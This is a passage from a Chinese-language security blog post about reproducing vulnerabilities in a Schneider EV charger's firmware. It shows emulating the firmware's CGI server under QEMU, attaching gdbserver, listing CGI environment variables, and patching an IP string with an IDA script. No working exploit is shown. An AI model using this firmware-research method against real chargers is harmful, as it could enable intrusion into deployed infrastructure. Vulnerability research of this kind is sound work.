S50sshd*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  534 11月  1 16:07 S50telnet*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx 5125 11月  1 16:07 S60evse_recovery*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  659 11月  1 16:07 S70evse_pre* &#x3D;&#x3D;&gt;prelaunch</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  704 11月  1 16:07 S80evse_apps* &#x3D;&#x3D;&gt;launch_evse_apps</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  608 11月  1 16:07 S90evse_post* &#x3D;&#x3D;&gt;evse_postlaunch.sh</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  621 11月  1 16:07 S99bspv5_watchdog*</span><br><span class="line">-rwxr-xr-x 1 webysx webysx  675 11月  1 16:07 _XXntp*</span><br></pre></td></tr></table></figure>
+<p>network</p>
+<p>prelaunch：/mnt/datas/evse_prelaunch.sh</p>
+<p>launch_evse_apps：/mnt/datas/launch_evse_apps.sh</p>
+<p>​                    running：/mnt/datas/opt/evse/run_evse.sh running</p>
+<p>evse_postlaunch.sh：/mnt/datas/evse_postlaunch.sh</p>
+<p>使用qemu-system模拟之后，访问cgiServer程序一直没有响应，使用gdb-multiarch调试，上传gdbserver，然后再使用gdbserver开启一个调试端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot . .&#x2F;gdbserver-7.7.1-armhf-eabi5-v1-sysv 192.168.43.140:1234 mnt&#x2F;datas&#x2F;opt&#x2F;www&#x2F;cgi-bin&#x2F;cgiServer</span><br></pre></td></tr></table></figure>
+<p>关于调试过程中程序报错找不到so文件，在文件系统目录下找到so文件，然后放到文件系统根目录的lib目录下。</p>
+<p>gdb调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">QUERY_STRING</span><br><span class="line">REQUEST_METHOD</span><br><span class="line">REMOTE_ADDR</span><br><span class="line">HTTP_COOKIE</span><br><span class="line">HTTP_USER_AGENT&#x3D;&quot;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko&#x2F;20100101 Firefox&#x2F;94.0&quot;</span><br><span class="line">SERVER_NAME</span><br><span class="line">SERVER_PORT</span><br><span class="line">CONTENT_TYPE</span><br><span class="line">CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line">REQUEST_METHOD GET&amp;POST</span><br><span class="line">POST: CONTENT_LENGTH CONTENT_TYPE</span><br><span class="line">GET: QUERY_STRING</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211120223741904.png"></p>
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211120224134598.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">patch_addr &#x3D; 0x24A498</span><br><span class="line">str &#x3D; &quot;192.168.43.102&quot;</span><br><span class="line"></span><br><span class="line">for i in range(len(str)):</span><br><span class="line">    PatchByte(patch_addr+i, ord(str[i]))</span><br><span class="line"></span><br><span class="line">PatchByte(patch_addr+i+1, 0)</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/06/23/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20211120225948860.png"></p>
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/357">施耐德充电桩漏洞挖掘之旅</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/doudoudouzoule/article/details/86017841">提取摄像头固件中应用逻辑代码</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JiuShu110/article/details/117986313">linux kernel 报错：FATAL: kernel too old</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6911560121034375175">一步步教你：如何用Qemu来模拟ARM系统</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.daimajiaoliu.com/daima/3385719d1900409">ubuntu下使用qemu-system-arm模拟arm环境</a></p>
+<p><a target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></p>
+<p><a target="_blank" rel="noopener" href="https://codeantenna.com/a/EUHPk8gb1j">构建ARM Linux交叉编译工具链 详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pengdonglin137/p/5023342.html">用Qemu模拟vexpress-a9 （一） — 搭建Linux kernel调试环境</a></p>
+<p><a target="_blank" rel="noopener" href="https://m.sohu.com/a/445823100_750628">IoT安全基本功系列——内核的编译与qemu启动</a></p>
+<p><a target="_blank" rel="noopener" href="https://freemandealer.github.io/2015/10/04/debug-kernel-with-qemu-2/">用QEMU来调试内核 – 亲身体验篇</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CVE" >
+    <span class="tag-code">CVE</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/06/23/%E5%AE%89%E5%85%A8%E7%88%BD%E6%96%87/">
+        <span class="nav-arrow">← </span>
+        
+          安全爽文
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/07/28/%E8%AE%B0%E5%87%A0%E9%81%93cft%E9%A2%98%EF%BC%88arm%EF%BC%89/">
+        
+          记几道cft题（arm）
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E6%96%BD%E8%80%90%E5%BE%B7%E5%85%85%E7%94%B5%E6%A1%A9%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-nav-text">施耐德充电桩系列漏洞复现</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-nav-text">漏洞介绍</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-nav-text">漏洞分析</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-nav-text">固件分析</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CVE-2021-22706"><span class="toc-nav-text">CVE-2021-22706</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CVE-2021-22707"><span class="toc-nav-text">CVE-2021-22707</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CVE-2021-22708"><span class="toc-nav-text">CVE-2021-22708</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-text">环境搭建</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/06/23/分析报告/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+    
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
